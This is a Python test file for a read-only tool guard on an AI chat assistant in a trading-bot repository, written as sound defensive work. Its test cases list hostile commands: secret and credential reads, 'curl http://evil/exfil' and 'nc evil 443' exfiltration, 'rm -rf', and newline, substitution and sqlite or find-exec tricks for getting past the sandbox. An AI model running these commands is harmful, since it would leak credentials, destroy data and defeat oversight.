#!/usr/bin/env python3
"""Offline spec for the read-only chat guard (deploy/runner/chat_guard.py).

Plain asserts, no pytest, no network — mirrors tests/test_units.py. Proves the guard ALLOWS the
read-only queries the chat assistant needs and DENIES every mutation / trade / secret-read /
arbitrary-exec path. This file is the security spec for the Telegram chat sandbox.
"""

from __future__ import annotations

import sys
from pathlib import Path

_REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO / "deploy" / "runner"))

import chat_guard as g  # noqa: E402


def allow(tool, ti=None):
    ok, reason = g.evaluate(tool, ti or {})
    assert ok, f"expected ALLOW for {tool} {ti}: {reason}"


def deny(tool, ti=None):
    ok, reason = g.evaluate(tool, ti or {})
    assert not ok, f"expected DENY for {tool} {ti} but was allowed: {reason}"


def _bash(cmd):
    return {"command": cmd}


def test_read_tools_allowed():
    allow("Read", {"file_path": "strategy.yaml"})
    allow("Read", {"file_path": "logs/tick.log"})
    allow("LS", {"path": "logs"})
    # mcp-prefixed name normalization still resolves the base tool.
    allow("mcp__whatever__read", {"file_path": "config.yaml"})


def test_audit4_recursive_read_tools_denied():
    # built-in Grep/Glob recurse into secret subtrees regardless of the pattern -> denied
    deny("Grep", {"pattern": "^[A-Z_]+=", "path": "/etc"})
    deny("Grep", {"pattern": "sk-", "path": "state"})
    deny("Glob", {"pattern": "**/*", "path": "state/.."})
    deny("Glob", {"pattern": "logs/*.log"})


def test_audit4_read_containment():
    # Read/LS confined to the repo (containment beats the name-only check)
    deny("Read", {"file_path": "/etc/passwd"})            # outside repo
    deny("Read", {"file_path": "/etc/quiver/quiver.env"})  # outside + secret
    deny("Read", {"file_path": "../../etc/shadow"})        # parent traversal
    deny("LS", {"path": "/etc"})
    allow("Read", {"file_path": "config.yaml"})
    allow("Read", {"file_path": "logs/reasoning/x.log"})


def test_audit4_bash_recursion_and_follow_flag_forms():
    # recursive grep walks into secrets — all flag forms denied
    deny("Bash", _bash("grep -r sk- state"))
    deny("Bash", _bash("grep -rn ANYKEY ."))
    deny("Bash", _bash("grep -R x ."))
    deny("Bash", _bash("grep -d recurse x ."))
    deny("Bash", _bash("ls -R state"))
    # bundled / =value follow forms that slipped the exact-token check
    deny("Bash", _bash("tail -qf logs/tick.log"))
    deny("Bash", _bash("tail -Fq logs/tick.log"))
    deny("Bash", _bash("tail --follow=descriptor logs/tick.log"))
    # benign flags still allowed (no r/f/R/F in the bundle)
    allow("Bash", _bash("grep -n error logs/tick.log"))
    allow("Bash", _bash("grep -io buy logs/tick.log"))
    allow("Bash", _bash("tail -n 100 logs/tick.log"))
    allow("Bash", _bash("ls -la logs"))


def test_read_tools_deny_secret_paths():
    deny("Read", {"file_path": ".env"})
    deny("Read", {"file_path": "/etc/quiver/quiver.env"})
    deny("Read", {"file_path": "state/claude-config/credentials.json"})
    deny("Grep", {"pattern": "x", "path": "../.env"})


def test_mutating_and_trade_tools_denied():
    deny("Write", {"file_path": "x", "content": "y"})
    deny("Edit", {"file_path": "x"})
    deny("NotebookEdit", {})
    deny("WebFetch", {"url": "http://x"})
    deny("WebSearch", {"query": "x"})
    # Even if an MCP order tool somehow appeared, it is denied by name.
    deny("mcp__robinhood-trading__place_equity_order", {"ref_id": "abc"})
    deny("place_equity_order", {"ref_id": "abc"})
    deny("cancel_equity_order", {"ref_id": "abc"})


def test_bash_readonly_utilities_allowed():
    allow("Bash", _bash("cat logs/tick.log"))
    allow("Bash", _bash("tail -n 50 logs/orchestrator.log"))
    allow("Bash", _bash("grep ERROR logs/tick.log | head -n 20"))
    allow("Bash", _bash("ls -la state"))
    allow("Bash", _bash("wc -l logs/tick.log"))
    allow("Bash", _bash("cat strategy.yaml config.yaml"))


def test_bash_sqlite_readonly_allowed_writes_denied():
    # The sqlite3 CLI is BANNED (writefile()/load_extension() SQL functions bypass -readonly).
    deny("Bash", _bash('sqlite3 -readonly state/ledger.db "SELECT * FROM decisions LIMIT 5;"'))
    deny("Bash", _bash('sqlite3 state/ledger.db "SELECT 1;"'))
    deny("Bash", _bash("sqlite3 -readonly state/ledger.db \"SELECT writefile('/tmp/x','y')\""))
    deny("Bash", _bash("sqlite3 -readonly state/ledger.db \"SELECT load_extension('/tmp/e.so')\""))
    deny("Bash", _bash("sqlite3 -readonly state/ledger.db \"SELECT readfile('/etc/passwd')\""))
    # ledger reads go through the sqlite3-MODULE wrapper (SELECT-only; no writefile/load_extension)
    allow("Bash", _bash('.venv/bin/python deploy/runner/chat_query.py "SELECT ticker FROM decisions LIMIT 5"'))
    allow("Bash", _bash(".venv/bin/python deploy/runner/chat_query.py --schema"))
    allow("Bash", _bash('.venv/bin/python deploy/runner/chat_query.py "SELECT * FROM outcomes WHERE realized_pnl > 0"'))


def test_bash_python_only_readonly_tick_subs():
    allow("Bash", _bash(".venv/bin/python tick.py decision-proof --id 42"))
    allow("Bash", _bash(".venv/bin/python tick.py strategy-history --limit 20"))
    allow("Bash", _bash(".venv/bin/python tick.py memory-show AAPL"))
    allow("Bash", _bash(".venv/bin/python -m lib.market"))
    allow("Bash", _bash('.venv/bin/python deploy/runner/chat_query.py "SELECT 1"'))
    # arbitrary code / write subcommands / other scripts -> denied
    deny("Bash", _bash('.venv/bin/python -c "import os; os.remove(\'x\')"'))
    deny("Bash", _bash(".venv/bin/python tick.py plan --input state/tmp/x.json"))
    deny("Bash", _bash(".venv/bin/python tick.py commit --input state/tmp/x.json"))
    deny("Bash", _bash(".venv/bin/python tick.py universe-apply --approve"))
    deny("Bash", _bash(".venv/bin/python analyze.py AAPL"))
    deny("Bash", _bash(".venv/bin/python -m lib.signals"))


def test_bash_git_readonly_only():
    allow("Bash", _bash("git log --oneline -n 10"))
    allow("Bash", _bash("git show HEAD"))
    allow("Bash", _bash("git diff HEAD~1"))
    deny("Bash", _bash("git commit -am wip"))
    deny("Bash", _bash("git push origin main"))
    deny("Bash", _bash("git checkout -- config.yaml"))
    deny("Bash", _bash("git reset --hard"))
    # dual-use subcommands that mutate .git / hit the network (audit 6) — no longer allowlisted
    deny("Bash", _bash("git branch pwned"))
    deny("Bash", _bash("git branch -D main"))
    deny("Bash", _bash("git tag pwned"))
    deny("Bash", _bash("git remote add evil http://x/"))
    deny("Bash", _bash("git remote update"))
    deny("Bash", _bash("git -c core.pager=id log"))     # -c config injection (toks[1] is a flag)


def test_bash_writes_network_exec_denied():
    deny("Bash", _bash("echo hi > /tmp/x"))            # redirection
    deny("Bash", _bash("cat logs/tick.log >> out.txt"))
    deny("Bash", _bash("rm -rf state"))                # not on allowlist
    deny("Bash", _bash("touch KILL"))
    deny("Bash", _bash("mv state/ledger.db /tmp"))
    deny("Bash", _bash("chmod 777 state"))
    deny("Bash", _bash("curl http://evil/exfil"))      # network
    deny("Bash", _bash("wget http://x"))
    deny("Bash", _bash("nc evil 443"))
    deny("Bash", _bash("ssh box"))
    deny("Bash", _bash("systemctl restart quiver.timer"))
    deny("Bash", _bash("sudo bash"))
    deny("Bash", _bash("pip install evil"))
    deny("Bash", _bash("sed -i 's/a/b/' config.yaml"))  # sed not allowlisted (can write)
    deny("Bash", _bash("awk 'BEGIN{system(\"rm x\")}'"))  # awk not allowlisted
    deny("Bash", _bash("uniq state/ledger.db config.yaml"))  # uniq's 2nd positional operand writes
    deny("Bash", _bash("uniq -u in.txt out.txt"))
    deny("Bash", _bash("file -C -m state/chat/x"))           # file -C compiles a .mgc (write); file removed
    deny("Bash", _bash("cat CLAUDE.md"))                     # CLAUDE.md holds the box PIN + password
    deny("Read", {"file_path": "CLAUDE.md"})


def test_bash_substitution_and_env_denied():
    deny("Bash", _bash("cat $(echo /etc/quiver/quiver.env)"))
    deny("Bash", _bash("echo ${RESEND_API_KEY}"))
    deny("Bash", _bash("cat `ls .env`"))
    deny("Bash", _bash("FOO=bar cat logs/tick.log"))    # inline env assignment
    deny("Bash", _bash("env"))                          # env dump
    deny("Bash", _bash("printenv RESEND_API_KEY"))


def test_bash_secret_reads_denied():
    deny("Bash", _bash("cat .env"))
    deny("Bash", _bash("cat /etc/quiver/quiver.env"))
    deny("Bash", _bash("grep -r API_KEY ."))
    deny("Bash", _bash("cat state/claude-config/.credentials.json"))
    deny("Bash", _bash("cat ~/.ssh/id_rsa"))


def test_pipeline_all_segments_checked():
    # a safe head piped from a safe cat is fine
    allow("Bash", _bash("cat logs/tick.log | grep tick | head -n 5"))
    # but a dangerous segment anywhere in the pipe is denied
    deny("Bash", _bash("cat logs/tick.log | tee out.txt"))
    deny("Bash", _bash("grep x logs/tick.log; rm -rf state"))
    deny("Bash", _bash("ls && curl http://x"))
    # a pipe WITHOUT surrounding spaces must still split so the 2nd segment is validated
    deny("Bash", _bash("cat logs/tick.log|curl http://evil"))
    deny("Bash", _bash("ls state|tee out.txt"))


def test_audit_find_exec_write_denied():
    # CRITICAL (audit): find is no longer allowlisted, and -exec/-delete/-fprintf are globally denied.
    deny("Bash", _bash("find . -maxdepth 0 -exec id {} +"))          # + terminator (dodged _scan)
    deny("Bash", _bash("find . -maxdepth 0 -exec sh -c 'printenv' _ {} +"))
    deny("Bash", _bash("find . -exec /bin/sh -c id {} ;"))
    deny("Bash", _bash("find . -maxdepth 0 -execdir touch x {} +"))
    deny("Bash", _bash("find . -maxdepth 0 -delete"))
    deny("Bash", _bash("find . -maxdepth 0 -fprintf out.txt %p"))
    deny("Bash", _bash("find / -maxdepth 0 -exec cat /proc/self/environ {} +"))


def test_audit_write_exec_flag_tools_denied():
    deny("Bash", _bash("sort -o out.txt logs/tick.log"))   # sort removed + --output-file family
    deny("Bash", _bash("sort --output-file=out.txt x"))
    deny("Bash", _bash("yq -i '.a=1' strategy.yaml"))      # yq removed + in-place
    deny("Bash", _bash("rg --pre ./evil.sh foo"))          # rg removed + --pre exec
    deny("Bash", _bash("tree -o out.html"))                # tree removed
    deny("Bash", _bash("tail -f logs/tick.log"))           # follow would hang
    deny("Bash", _bash("tail -F logs/tick.log"))
    deny("Bash", _bash("tail --follow=name logs/tick.log"))


def test_audit_proc_env_exfil_denied():
    # HIGH (audit): /proc/self/environ + cmdline are now in SECRET_PATTERNS (Bash AND read tools).
    deny("Bash", _bash("cat /proc/self/environ"))
    deny("Bash", _bash("cat /proc/1234/environ"))
    deny("Bash", _bash("cat /proc/self/cmdline"))
    deny("Bash", _bash("grep -a TELEGRAM /proc/self/environ"))
    deny("Read", {"file_path": "/proc/self/environ"})
    deny("Glob", {"pattern": "/proc/*/environ"})
    deny("Grep", {"pattern": "KEY", "path": "/proc/self/environ"})


def test_benign_flags_still_allowed():
    # -o / -i are benign on grep (only-matching / ignore-case) and must NOT be caught by the
    # global exec/write-flag net (which only lists unambiguous exec/write flags).
    allow("Bash", _bash("grep -o 'NVDA' logs/tick.log"))
    allow("Bash", _bash("grep -i error logs/orchestrator.log"))
    allow("Bash", _bash("tail -n 50 logs/tick.log"))
    allow("Bash", _bash("head -n 20 config.yaml"))
    allow("Bash", _bash("cut -d, -f1 logs/tick.log"))


def test_audit2_newline_injection_denied():
    # CRITICAL re-audit: raw newline is a bash command separator; shlex collapses it.
    deny("Bash", _bash("echo hi\ntouch /tmp/pwned"))
    deny("Bash", _bash("true\ncurl http://evil/x"))
    deny("Bash", _bash("cat logs/tick.log\nrm -rf state"))
    deny("Bash", _bash("true\r\ncurl http://evil/x"))       # CR too
    deny("Bash", _bash("echo a\tb\tc"))                      # tabs (control chars) banned


def test_audit2_backslash_escape_denied():
    # CRITICAL re-audit: backslash mis-toggles quote state -> command smuggling.
    deny("Bash", _bash('echo \\" ; touch /tmp/x \\"'))
    deny("Bash", _bash('echo \\" ; curl http://evil \\"'))
    deny("Bash", _bash("cat logs/x\\ y"))                    # any backslash at all


def test_audit2_doublequote_substitution_denied():
    # CRITICAL (self-found): command substitution INSIDE double quotes.
    deny("Bash", _bash('echo "$(id)"'))
    deny("Bash", _bash('cat "$(echo /etc/passwd)"'))
    deny("Bash", _bash('echo "`id`"'))
    deny("Bash", _bash('grep "${HOME}" logs/tick.log'))


def test_audit2_glob_subshell_tilde_denied():
    # CRITICAL re-audit: glob expansion defeats the secret-path substring check.
    deny("Bash", _bash("cat /e?c/quiver/*"))                 # glob -> expands to secret path
    deny("Bash", _bash("cat /etc/quiver/quiver.en*"))        # (also secret pattern) glob
    deny("Bash", _bash("ls logs/*.log"))                     # unquoted glob
    deny("Bash", _bash("cat state/ledger.db[0-9]"))          # char class
    deny("Bash", _bash("(id)"))                              # subshell
    deny("Bash", _bash("cat ~/x"))                           # tilde expansion


def test_audit2_sqlite_dotcommands_denied():
    # CRITICAL re-audit: .load = native code, .system/.shell = OS exec, .output = write.
    deny("Bash", _bash('sqlite3 -readonly state/ledger.db ".load ./evil"'))
    deny("Bash", _bash('sqlite3 -readonly state/ledger.db ".system id"'))
    deny("Bash", _bash('sqlite3 -readonly state/ledger.db ".shell id"'))
    deny("Bash", _bash('sqlite3 -readonly state/ledger.db ".output /tmp/x"'))
    deny("Bash", _bash('sqlite3 -readonly -cmd ".load ./evil" state/ledger.db "SELECT 1;"'))
    deny("Bash", _bash('sqlite3 -readonly -init /tmp/evil.sql state/ledger.db "SELECT 1;"'))
    # git write-output flag
    deny("Bash", _bash("git diff --output=/tmp/x HEAD"))


def test_audit2_legit_sql_and_paths_still_allowed():
    # double-quoted SQL with an INNER single-quoted string literal (the common ticker query)
    allow("Bash", _bash('.venv/bin/python deploy/runner/chat_query.py "SELECT * FROM decisions WHERE ticker=\'NVDA\'"'))
    # quoted regex metachars are literal data -> allowed
    allow("Bash", _bash("grep -E 'ERROR|WARN' logs/tick.log"))
    allow("Bash", _bash("grep 'pnl > 0' logs/tick.log"))


def test_audit3_jq_and_script_pinning():
    # jq removed — its env/$ENV builtin reads the process environment
    deny("Bash", _bash("jq -n env"))
    deny("Bash", _bash("jq -n '$ENV'"))
    deny("Bash", _bash("jq -rn '$ENV|to_entries'"))
    # script pinning: only the repo's real chat_query.py/tick.py, never a planted path
    deny("Bash", _bash('.venv/bin/python /tmp/evil/chat_query.py "SELECT 1"'))
    deny("Bash", _bash('.venv/bin/python ../../tmp/chat_query.py "SELECT 1"'))
    deny("Bash", _bash(".venv/bin/python /tmp/evil/tick.py decision-proof --id 1"))
    deny("Bash", _bash(".venv/bin/python ../tick.py decision-proof --id 1"))
    # the real repo-relative invocations still work
    allow("Bash", _bash('.venv/bin/python deploy/runner/chat_query.py "SELECT 1"'))
    allow("Bash", _bash(".venv/bin/python ./deploy/runner/chat_query.py --schema"))
    allow("Bash", _bash(".venv/bin/python tick.py decision-proof --id 1"))


def test_audit5_bash_read_containment():
    # HIGH (audit 5): coreutil file reads must be confined to the repo, not just secret-checked.
    deny("Bash", _bash("cat /etc/passwd"))
    deny("Bash", _bash("cat /home/quiver/.netrc"))
    deny("Bash", _bash("cat ~/.config/gh/hosts.yml"))
    deny("Bash", _bash("cat ../../../etc/passwd"))
    deny("Bash", _bash("grep -i key /home/quiver/somefile.conf"))
    deny("Bash", _bash("head -c 4000 /home/quiver/.bash_history"))
    deny("Bash", _bash("ls /etc"))
    deny("Bash", _bash("stat /"))
    # in-repo reads still work; /var/log/quiver (the box's secret-free log dir) is an allowed root
    allow("Bash", _bash("cat config.yaml strategy.yaml"))
    allow("Bash", _bash("grep -n error logs/tick.log"))
    allow("Bash", _bash("tail -n 100 logs/reasoning/x.log"))
    allow("Bash", _bash("wc -l logs/orchestrator.log"))
    allow("Bash", _bash("cat /var/log/quiver/tick.log"))
    allow("Read", {"file_path": "/var/log/quiver/tick.log"})


def test_empty_and_unknown_fail_closed():
    deny("Bash", _bash(""))
    deny("Bash", _bash("   "))
    deny("SomeUnknownTool", {})


def main() -> int:
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    failed = 0
    for t in tests:
        try:
            t()
            print(f"  ok  {t.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL  {t.__name__}: {e}")
    print(f"\n{len(tests) - failed} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
